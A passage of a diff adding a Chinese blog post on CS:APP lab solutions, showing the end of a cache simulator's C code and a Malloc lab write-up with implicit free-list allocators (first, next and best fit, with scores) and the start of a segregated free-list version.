+        <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;M&#39;</span> <span style="color:#f92672">&amp;&amp;</span> buf[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;L&#39;</span> <span style="color:#f92672">&amp;&amp;</span> buf[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;S&#39;</span>) {
+            <span style="color:#66d9ef">continue</span>;
+        }
+        sscanf(buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#34;%llx,%u &#34;</span>, <span style="color:#f92672">&amp;</span>address, <span style="color:#f92672">&amp;</span>size);
+        <span style="color:#66d9ef">if</span> (v)
+            printf(<span style="color:#e6db74">&#34;%c %llx,%u &#34;</span>, buf[<span style="color:#ae81ff">1</span>], address, size);
+        accessData(address);
+        <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;M&#39;</span>) {
+            accessData(address);
+        }
+        <span style="color:#66d9ef">if</span> (v) putchar(<span style="color:#e6db74">&#39;\n&#39;</span>);
+    }
+    <span style="color:#66d9ef">return</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
+    <span style="color:#66d9ef">char</span> o;
+    <span style="color:#66d9ef">while</span> ((o <span style="color:#f92672">=</span> getopt(argc, argv, <span style="color:#e6db74">&#34;hvs:E:b:t:&#34;</span>)) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+        <span style="color:#66d9ef">switch</span> (o) {
+            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;h&#39;</span><span style="color:#f92672">:</span>
+                printUsage(argv[<span style="color:#ae81ff">0</span>]);
+                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;v&#39;</span><span style="color:#f92672">:</span>
+                v <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+                <span style="color:#66d9ef">break</span>;
+            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;s&#39;</span><span style="color:#f92672">:</span>
+                s <span style="color:#f92672">=</span> atoi(optarg);
+                <span style="color:#66d9ef">break</span>;
+            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;E&#39;</span><span style="color:#f92672">:</span>
+                E <span style="color:#f92672">=</span> atoi(optarg);
+                <span style="color:#66d9ef">break</span>;
+            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">:</span>
+                b <span style="color:#f92672">=</span> atoi(optarg);
+                <span style="color:#66d9ef">break</span>;
+            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;t&#39;</span><span style="color:#f92672">:</span>
+                tracefile <span style="color:#f92672">=</span> optarg;
+                fp <span style="color:#f92672">=</span> fopen(tracefile, <span style="color:#e6db74">&#34;r&#34;</span>);
+                <span style="color:#66d9ef">if</span> (fp <span style="color:#f92672">==</span> NULL) {
+                    printf(<span style="color:#e6db74">&#34;File %s open failed.&#34;</span>, tracefile);
+                    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+                }
+                <span style="color:#66d9ef">break</span>;
+            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+                printUsage(argv[<span style="color:#ae81ff">0</span>]);
+                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+        }
+    }
+    <span style="color:#66d9ef">if</span> (s <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> E <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>tracefile <span style="color:#f92672">||</span> b <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
+        printUsage(argv[<span style="color:#ae81ff">0</span>]);
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+    S <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> s;
+    B <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> b;
+
+    initCache();
+    replayTrace(fp);
+
+    printSummary(hit_count, miss_count, eviction_count);
+
+    releaseCache();
+    fclose(fp);
+    
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><h2 id="lab10-malloc-lab">Lab10 Malloc-lab</h2>
+<p>实现了两种 Malloc</p>
+<h3 id="隐式链表">隐式链表</h3>
+<pre tabindex="0"><code>+-----------------+
+| chunksize | 00A | A: Alloc
++-----------------+
+|    (padding)    |
++-----------------+
+| chunksize | 00A | A: Alloc
++-----------------+
+</code></pre><p>宏定义</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* single word (4) or double word (8) alignment */</span>
+<span style="color:#75715e">#define ALIGNMENT 8
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define WSIZE 4                 </span><span style="color:#75715e">/* Word and header/footer size (bytes) */</span><span style="color:#75715e">
+</span><span style="color:#75715e">#define DSIZE 8                 </span><span style="color:#75715e">/* Double word size (bytes) */</span><span style="color:#75715e">
+</span><span style="color:#75715e">#define CHUNKSIZE (1 &lt;&lt; 12)     </span><span style="color:#75715e">/* Extend hea by this amount (bytes) */</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define MAX(x, y) ((x) &gt; (y) ? (x) : (y))
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/* rounds up to the nearest multiple of ALIGNMENT */</span>
+<span style="color:#75715e">#define ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7)
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define SIZE_T_SIZE (ALIGN(sizeof(size_t)))
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/* Pack a size and allocated bit into a word */</span>
+<span style="color:#75715e">#define PACK(size, alloc) ((size) | (alloc))
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/* Read and write a word at address p */</span>
+<span style="color:#75715e">#define GET(p) (*(unsigned int*)(p))
+</span><span style="color:#75715e">#define PUT(p, val) (*(unsigned int*)(p) = (val))
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define GET_SIZE(p) (GET(p) &amp; ~0x7)
+</span><span style="color:#75715e">#define GET_ALLOC(p) (GET(p) &amp; 0x1)
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/* Given block ptr bp, compute address of its header and footer */</span>
+<span style="color:#75715e">#define HDRP(bp) ((char*)(bp) - WSIZE)
+</span><span style="color:#75715e">#define FTRP(bp) ((char*)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/* Given block ptr bp, compute address of next and previous blocks */</span>
+<span style="color:#75715e">#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char*)(bp) - WSIZE)))
+</span><span style="color:#75715e">#define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char*)(bp) - DSIZE)))
+</span></code></pre></div><p>用宏定义编译方便一些</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define FIRST_FIT 1
+</span><span style="color:#75715e">#define NEXT_FIT 2
+</span><span style="color:#75715e">#define BEST_FIT 3
+</span></code></pre></div><p>一些全局变量</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>heap_listp;
+
+<span style="color:#75715e">#if FIT_ALGO == NEXT_FIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cur_listp;
+<span style="color:#75715e">#endif
+</span></code></pre></div><p>核心代码直接抄书：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
+</span><span style="color:#75715e"> * coalesce - Coalesce free block next by
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">coalesce</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>bp) {
+    size_t prev_alloc <span style="color:#f92672">=</span> GET_ALLOC(FTRP(PREV_BLKP(bp)));
+    size_t next_alloc <span style="color:#f92672">=</span> GET_ALLOC(HDRP(NEXT_BLKP(bp)));
+
+    size_t size <span style="color:#f92672">=</span> GET_SIZE(HDRP(bp));
+    <span style="color:#66d9ef">if</span> (prev_alloc <span style="color:#f92672">&amp;&amp;</span> next_alloc)
+        <span style="color:#66d9ef">return</span> bp;
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>next_alloc <span style="color:#f92672">&amp;&amp;</span> prev_alloc) {
+        size <span style="color:#f92672">+=</span> GET_SIZE(HDRP(NEXT_BLKP(bp)));
+        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span style="color:#ae81ff">0</span>));
+        PUT(HDRP(bp), PACK(size, <span style="color:#ae81ff">0</span>));
+    }
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>prev_alloc <span style="color:#f92672">&amp;&amp;</span> next_alloc) {
+        size <span style="color:#f92672">+=</span> GET_SIZE(FTRP(PREV_BLKP(bp)));
+        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span style="color:#ae81ff">0</span>));
+        PUT(FTRP(bp), PACK(size, <span style="color:#ae81ff">0</span>));
+        bp <span style="color:#f92672">=</span> PREV_BLKP(bp);
+    }
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>prev_alloc <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>next_alloc) {
+        size <span style="color:#f92672">+=</span> GET_SIZE(FTRP(PREV_BLKP(bp)));
+        size <span style="color:#f92672">+=</span> GET_SIZE(HDRP(NEXT_BLKP(bp)));
+        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span style="color:#ae81ff">0</span>));
+        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span style="color:#ae81ff">0</span>));
+        bp <span style="color:#f92672">=</span> PREV_BLKP(bp);
+    };
+
+<span style="color:#75715e">#if FIT_ALGO == NEXT_FIT
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (cur_listp <span style="color:#f92672">&gt;</span> bp <span style="color:#f92672">&amp;&amp;</span> cur_listp <span style="color:#f92672">&lt;</span> NEXT_BLKP(bp))
+        cur_listp <span style="color:#f92672">=</span> bp;
+<span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">return</span> bp;
+}
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * extend_heap - extend heap with a free block
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">extend_heap</span>(size_t words) {
+    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>bp;
+    size_t size;
+    <span style="color:#75715e">/* Allocate and even number of words to maintain alignment */</span>
+    size <span style="color:#f92672">=</span> (words <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">?</span> (words <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> WSIZE : words <span style="color:#f92672">*</span> WSIZE;
+    <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">long</span>)(bp <span style="color:#f92672">=</span> mem_sbrk(size)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+        <span style="color:#66d9ef">return</span> NULL;
+
+    <span style="color:#75715e">/* Initialize free block header/footer and the epilogue header */</span>
+    PUT(HDRP(bp), PACK(size, <span style="color:#ae81ff">0</span>));
+    PUT(FTRP(bp), PACK(size, <span style="color:#ae81ff">0</span>));
+    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>));
+
+    <span style="color:#75715e">/* Coalesce if the previous block was free */</span>
+    <span style="color:#66d9ef">return</span> coalesce(bp);
+}
+
+<span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * mm_init - initialize the malloc package.
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">mm_init</span>(<span style="color:#66d9ef">void</span>)
+{
+    <span style="color:#75715e">/* Create the initial empty heap */</span>
+    <span style="color:#66d9ef">if</span> ((heap_listp <span style="color:#f92672">=</span> mem_sbrk(<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> WSIZE)) <span style="color:#f92672">==</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)   <span style="color:#75715e">/* sbrk() function returns the start address of the new area. */</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    PUT(heap_listp, <span style="color:#ae81ff">0</span>);                                     <span style="color:#75715e">/* Alignment */</span>
+    PUT(heap_listp <span style="color:#f92672">+</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> WSIZE), PACK(DSIZE, <span style="color:#ae81ff">1</span>));          <span style="color:#75715e">/* Prologue block&#39;s size is 8 and is always alloced */</span>
+    PUT(heap_listp <span style="color:#f92672">+</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> WSIZE), PACK(DSIZE, <span style="color:#ae81ff">1</span>));
+    PUT(heap_listp <span style="color:#f92672">+</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> WSIZE), PACK(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>));              <span style="color:#75715e">/* Epilogue header */</span>
+    heap_listp <span style="color:#f92672">+=</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> WSIZE);
+    
+<span style="color:#75715e">#if FIT_ALGO == NEXT_FIT
+</span><span style="color:#75715e"></span>    cur_listp <span style="color:#f92672">=</span> heap_listp;
+<span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">if</span> (extend_heap(CHUNKSIZE<span style="color:#f92672">/</span>WSIZE) <span style="color:#f92672">==</span> NULL)
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * mm_malloc - Allocate a block by incrementing the brk pointer.
+</span><span style="color:#75715e"> *     Always allocate a block whose size is a multiple of the alignment.
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">mm_malloc</span>(size_t size)
+{
+    <span style="color:#75715e">/* Ignore spurious requests */</span>
+    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
+        <span style="color:#66d9ef">return</span> NULL;
+    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> DSIZE)
+        size <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> DSIZE;
+    size_t newsize <span style="color:#f92672">=</span> size <span style="color:#f92672">+</span> DSIZE <span style="color:#f92672">+</span> ((<span style="color:#f92672">-</span>size) <span style="color:#f92672">%</span> DSIZE);
+    <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> bp;
+    <span style="color:#75715e">// int newsize = ALIGN(size + SIZE_T_SIZE);
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ((bp <span style="color:#f92672">=</span> find_fit(newsize)) <span style="color:#f92672">!=</span> NULL) {
+        place(bp, newsize);
+        <span style="color:#66d9ef">return</span> bp;
+    }
+    size_t extendsize <span style="color:#f92672">=</span> MAX(newsize, CHUNKSIZE);
+    <span style="color:#66d9ef">if</span> ((bp <span style="color:#f92672">=</span> extend_heap(extendsize<span style="color:#f92672">/</span>WSIZE)) <span style="color:#f92672">==</span> NULL)
+	   <span style="color:#66d9ef">return</span> NULL;
+    place(bp, newsize);
+    <span style="color:#66d9ef">return</span> bp;
+}
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * mm_free - Freeing a block does nothing.
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">mm_free</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr)
+{
+    size_t size <span style="color:#f92672">=</span> GET_SIZE(HDRP(ptr));
+
+    PUT(HDRP(ptr), PACK(size, <span style="color:#ae81ff">0</span>));
+    PUT(FTRP(ptr), PACK(size, <span style="color:#ae81ff">0</span>));
+
+    coalesce(ptr);
+}
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">mm_realloc</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr, size_t size)
+{
+    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>oldptr <span style="color:#f92672">=</span> ptr;
+    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>newptr;
+    size_t copySize;
+    
+    newptr <span style="color:#f92672">=</span> mm_malloc(size);
+    <span style="color:#66d9ef">if</span> (newptr <span style="color:#f92672">==</span> NULL)
+      <span style="color:#66d9ef">return</span> NULL;
+    size <span style="color:#f92672">=</span> GET_SIZE(HDRP(oldptr));
+    <span style="color:#75715e">// copySize = *(size_t *)((char *)oldptr - SIZE_T_SIZE);
+</span><span style="color:#75715e"></span>    copySize <span style="color:#f92672">=</span> GET_SIZE(HDRP(newptr));
+    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;</span> copySize)
+      copySize <span style="color:#f92672">=</span> size;
+    memcpy(newptr, oldptr, copySize <span style="color:#f92672">-</span> WSIZE);
+    mm_free(oldptr);
+    <span style="color:#66d9ef">return</span> newptr;
+}
+</code></pre></div><p>书上最后留了两个函数作为例题</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">place</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>bp, size_t size){
+    size_t origin_size <span style="color:#f92672">=</span> GET_SIZE(HDRP(bp));
+    <span style="color:#66d9ef">if</span> (origin_size <span style="color:#f92672">-</span> size <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> DSIZE) {
+        PUT(HDRP(bp), PACK(size, <span style="color:#ae81ff">1</span>));
+        PUT(FTRP(bp), PACK(size, <span style="color:#ae81ff">1</span>));
+
+        PUT(HDRP(NEXT_BLKP(bp)), PACK(origin_size <span style="color:#f92672">-</span> size, <span style="color:#ae81ff">0</span>));
+        PUT(FTRP(NEXT_BLKP(bp)), PACK(origin_size <span style="color:#f92672">-</span> size, <span style="color:#ae81ff">0</span>));
+    } <span style="color:#66d9ef">else</span> {
+        PUT(HDRP(bp), PACK(origin_size, <span style="color:#ae81ff">1</span>));
+        PUT(FTRP(bp), PACK(origin_size, <span style="color:#ae81ff">1</span>));
+    }
+    <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>实现了三种不同的 fit 算法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * util: 74%
+</span><span style="color:#75715e"> * secs: 0.4585
+</span><span style="color:#75715e"> * Perf index = 44 (util) + 16 (thru) = 61 / 100
+</span><span style="color:#75715e"> */</span>
+<span style="color:#75715e">#if FIT_ALGO == FIRST_FIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">find_fit</span>(size_t size) {
+    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>tmp_listp <span style="color:#f92672">=</span> heap_listp;
+    <span style="color:#66d9ef">while</span> (GET_SIZE(HDRP(tmp_listp)) <span style="color:#f92672">&lt;</span> size <span style="color:#f92672">||</span> GET_ALLOC(HDRP(tmp_listp))) {
+        <span style="color:#66d9ef">if</span> (GET_SIZE(HDRP(tmp_listp)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+            <span style="color:#66d9ef">return</span> NULL;
+        }
+        tmp_listp <span style="color:#f92672">=</span> NEXT_BLKP(tmp_listp);
+    }
+    <span style="color:#66d9ef">return</span> tmp_listp;
+}
+<span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * util: 73%
+</span><span style="color:#75715e"> * secs: 0.0918
+</span><span style="color:#75715e"> * Perf index = 44 (util) + 40 (thru) = 84/100
+</span><span style="color:#75715e"> */</span>
+<span style="color:#75715e"># elif FIT_ALGO == NEXT_FIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">find_fit</span>(size_t size) {
+    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>tmp_listp;
+    <span style="color:#66d9ef">for</span> (tmp_listp <span style="color:#f92672">=</span> cur_listp; GET_SIZE(HDRP(tmp_listp)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>; tmp_listp <span style="color:#f92672">=</span> NEXT_BLKP(tmp_listp)) {
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GET_ALLOC(HDRP(tmp_listp)) <span style="color:#f92672">&amp;&amp;</span> GET_SIZE(HDRP(tmp_listp)) <span style="color:#f92672">&gt;=</span> size) {
+            cur_listp <span style="color:#f92672">=</span> tmp_listp;
+            <span style="color:#66d9ef">return</span> tmp_listp;
+        }
+    }
+    <span style="color:#66d9ef">for</span> (tmp_listp <span style="color:#f92672">=</span> heap_listp; tmp_listp <span style="color:#f92672">!=</span> cur_listp; tmp_listp <span style="color:#f92672">=</span> NEXT_BLKP(tmp_listp)) {
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GET_ALLOC(HDRP(tmp_listp)) <span style="color:#f92672">&amp;&amp;</span> GET_SIZE(HDRP(tmp_listp)) <span style="color:#f92672">&gt;=</span> size) {
+            cur_listp <span style="color:#f92672">=</span> tmp_listp;
+            <span style="color:#66d9ef">return</span> tmp_listp;
+        }
+    }
+    <span style="color:#66d9ef">return</span> NULL;
+}
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * util: 75%
+</span><span style="color:#75715e"> * secs: 0.4660
+</span><span style="color:#75715e"> * Perf index = 45 (util) + 16 (thru) = 61/100
+</span><span style="color:#75715e"> */</span>
+<span style="color:#75715e"># elif FIT_ALGO == BEST_FIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">find_fit</span>(size_t size) {
+    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>best_listp <span style="color:#f92672">=</span> NULL;
+    size_t best_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7fffffff</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>tmp_listp <span style="color:#f92672">=</span> heap_listp; GET_SIZE(HDRP(tmp_listp)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>; tmp_listp <span style="color:#f92672">=</span> NEXT_BLKP(tmp_listp)) {
+        size_t cur_size <span style="color:#f92672">=</span> GET_SIZE(HDRP(tmp_listp));
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GET_ALLOC(HDRP(tmp_listp)) <span style="color:#f92672">&amp;&amp;</span> cur_size <span style="color:#f92672">&gt;=</span> size) {
+            <span style="color:#66d9ef">if</span> (cur_size <span style="color:#f92672">==</span> size) {
+                <span style="color:#66d9ef">return</span> tmp_listp;
+            }
+            <span style="color:#66d9ef">if</span> (cur_size <span style="color:#f92672">&lt;</span> best_size) {
+                best_size <span style="color:#f92672">=</span> cur_size;
+                best_listp <span style="color:#f92672">=</span> tmp_listp;
+            }
+        }
+    }
+    <span style="color:#66d9ef">return</span> best_listp;
+}
+
+<span style="color:#75715e"># endif
+</span></code></pre></div><p>next fit 远高于另外两个算法</p>
+<h3 id="分离适配">分离适配</h3>
+<pre tabindex="0"><code>+-+-+-+-+-+-+-+-+-+-+
+| Block Size  | 00A | A: Alloc
++-+-+-+-+-+-+-+-+-+-+
+|       pred        |
++-+-+-+-+-+-+-+-+-+-+
+|       succ        |
++-+-+-+-+-+-+-+-+-+-+
+|      Payload      |
++-+-+-+-+-+-+-+-+-+-+
+|      Padding      |
++-+-+-+-+-+-+-+-+-+-+
+| Block Size  | 00A | A: Alloc
++-+-+-+-+-+-+-+-+-+-+
+</code></pre><p>新增的宏定义</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define MIN_BLOCK_SIZE 16
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/* Given block ptr bp, compute pred and succ block */</span>
+<span style="color:#75715e">#define FD(bp) (*(char**)(bp))
+</span><span style="color:#75715e">#define BK(bp) (*(char**)((bp) + WSIZE))
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/* Given block ptr bp, compute pred and succ ptr address*/</span>
+<span style="color:#75715e">#define FD_PTR(bp) ((char*)(bp))
+</span><span style="color:#75715e">#define BK_PTR(bp) ((char*)(bp + WSIZE))
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define SET_FD(bp, val) (*(unsigned int*)(bp) = (unsigned int)(val))
+</span><span style="color:#75715e">#define SET_BK(bp, val) (*(unsigned int*)(bp+WSIZE) = (unsigned int)(val))
+</span></code></pre></div><p>需要一个新的全局变量来存储几个链表</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define FREE_LIST_SIZE 10
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>free_lists[FREE_LIST_SIZE] <span style="color:#f92672">=</span> {NULL};
+</code></pre></div><p>操作链表的函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* Following funcions was method of free_lists */</span>
+size_t <span style="color:#a6e22e">size_to_type</span>(size_t size) {
+    size_t x <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">if</span>   (size <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>)        ;
+    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">32</span>)    x <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">64</span>)    x <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">128</span>)   x <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">256</span>)   x <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
+    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">512</span>)   x <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
+    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>)  x <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">2048</span>)  x <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
